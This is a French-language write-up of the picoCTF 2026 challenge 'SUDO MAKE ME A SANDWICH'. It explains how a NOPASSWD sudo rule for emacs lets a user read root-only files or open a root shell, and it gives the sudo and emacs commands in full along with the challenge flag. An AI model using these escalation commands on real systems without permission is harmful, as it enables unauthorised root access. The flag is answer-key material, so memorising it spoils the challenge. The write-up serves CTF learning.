# 735 — SUDO MAKE ME A SANDWICH

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé
« Can you read the flag? I think you can! » Accès SSH à la machine du challenge, avec un
`flag.txt` dans le répertoire de l'utilisateur.

## Analyse
Le titre donne la piste : il y a une règle `sudo` exploitable. `sudo -l` montre que l'utilisateur
`ctf-player` peut exécuter **`/bin/emacs` en NOPASSWD**. Un éditeur capable de lancer un shell (ou
de lire un fichier) avec les droits de root suffit : c'est un cas d'école GTFOBins.

Un writeup public utilise la voie la plus directe — `sudo /bin/emacs flag.txt` ouvre le fichier en
root et l'affiche — et la page de solution détaille aussi :
- interactif : dans emacs, `M-x term` puis `cat /home/ctf-player/flag.txt` ;
- non interactif (pas de PTY) :
  `sudo emacs -Q --batch --eval '(with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (message "%s" (buffer-string)))'`.

## Solution
```bash
ssh ctf-player@<HOST> -p <PORT>
sudo -l
# (ALL) NOPASSWD: /bin/emacs
sudo /bin/emacs flag.txt
# ou, sans interaction :
sudo emacs -Q -nw --eval '(term "/bin/bash")'
cat /home/ctf-player/flag.txt
```

## Flag
```
picoCTF{ju57_5ud0_17_cce7a3f7}
```

## Sources
- https://picoctfsolutions.com/picoctf-2026-sudo-make-me-a-sandwich — page de solution picoCTF 2026 (`sudo -l`, échappées emacs/GTFOBins)
- https://qiita.com/8omp/items/8e1aa38aeda96fa0ecb6 — writeup picoCTF 2026 General Skills (sortie de `sudo -l`, flag complet)
- https://shukularuni.neocities.org/guide/ctf/picoctf/general/SUDO_MAKE_ME_A_SANDWICH.html — guide picoCTF/CyLab Academy sur le même challenge
